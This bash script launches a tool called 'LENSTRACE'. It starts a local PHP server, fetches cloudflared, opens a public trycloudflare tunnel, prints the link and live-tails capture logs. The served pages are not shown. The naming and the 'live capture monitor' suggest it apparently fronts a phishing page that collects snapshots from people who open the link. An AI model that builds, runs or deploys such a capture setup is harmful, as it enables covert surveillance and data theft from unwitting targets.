#!/usr/bin/env bash

# ============================================================
#  LENSTRACE - Automated Snapshot Telemetry Console
#  by CHRIZ • SKY TECH&CRAFTS
# ============================================================

clear

# ------------------ Branding (UNCHANGED) -------------------
echo -e "\e[35m"
cat << "EOF"
██╗     ███████╗███╗   ██╗███████╗████████╗██████╗  █████╗  ██████╗███████╗
██║     ██╔════╝████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██║     █████╗  ██╔██╗ ██║███████╗   ██║   ██████╔╝███████║██║     █████╗  
██║     ██╔══╝  ██║╚██╗██║╚════██║   ██║   ██╔══██╗██╔══██║██║     ██╔══╝  
███████╗███████╗██║ ╚████║███████║   ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "\e[0m"

echo -e "\e[35mLENSTRACE\e[0m"
echo "Automated Snapshot Telemetry Console"
echo "by CHRIZ • SKY TECH&CRAFTS"
echo "--------------------------------------------------"

# ------------------ Core Config -----------------------------
HOST="127.0.0.1"
PORT="8080"
CLOUDFLARED="./cloudflared"
TUNNEL_LOG="tunnel_silent.log"

# ------------------ PHP Server ------------------------------
echo "[✓] Starting PHP server on $HOST:$PORT ..."
php -S "$HOST:$PORT" > /dev/null 2>&1 &
PHP_PID=$!

sleep 1

# ------------------ Architecture Detection ------------------
ARCH=$(uname -m)

case "$ARCH" in
  aarch64|arm64)
    CF_ARCH="arm64"
    ;;
  x86_64|amd64)
    CF_ARCH="amd64"
    ;;
  *)
    echo "[!] Unsupported CPU architecture: $ARCH"
    kill $PHP_PID 2>/dev/null
    exit 1
    ;;
esac

echo "[✓] Detected architecture: $ARCH"

# ------------------ Cloudflared Setup -----------------------
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH"

if [ ! -f "$CLOUDFLARED" ]; then
  echo "[*] Downloading cloudflared ($CF_ARCH)..."
  curl -L "$CF_URL" -o cloudflared || {
    echo "[!] Failed to download cloudflared"
    kill $PHP_PID 2>/dev/null
    exit 1
  }
  chmod +x cloudflared
fi

# ------------------ Binary Validation -----------------------
"$CLOUDFLARED" --version >/dev/null 2>&1 || {
  echo "[!] cloudflared binary incompatible with this system"
  kill $PHP_PID 2>/dev/null
  exit 1
}

echo "[✓] Cloudflared binary ready"

# ------------------ Tunnel Startup --------------------------
echo "[*] Establishing Cloudflare Tunnel..."
nohup "$CLOUDFLARED" tunnel --url "http://$HOST:$PORT" \
  --no-autoupdate > "$TUNNEL_LOG" 2>&1 &

sleep 5

# ------------------ Public URL Extraction -------------------
PUBLIC_URL=$(grep -oE "https://[-a-zA-Z0-9\.]+\.trycloudflare\.com" "$TUNNEL_LOG" | head -n1)

if [ -z "$PUBLIC_URL" ]; then
  echo "[!] Tunnel failed. Check $TUNNEL_LOG"
  kill $PHP_PID 2>/dev/null
  exit 1
fi

echo -e "[✓] Tunnel established"
echo -e "🌐 Public URL: \e[36m$PUBLIC_URL\e[0m"
echo "--------------------------------------------------"
echo "📡 LIVE CAPTURE MONITOR"
echo "Press Ctrl+C to stop"

# ------------------ Live Monitor ----------------------------
tail -f capture/*.log 2>/dev/null
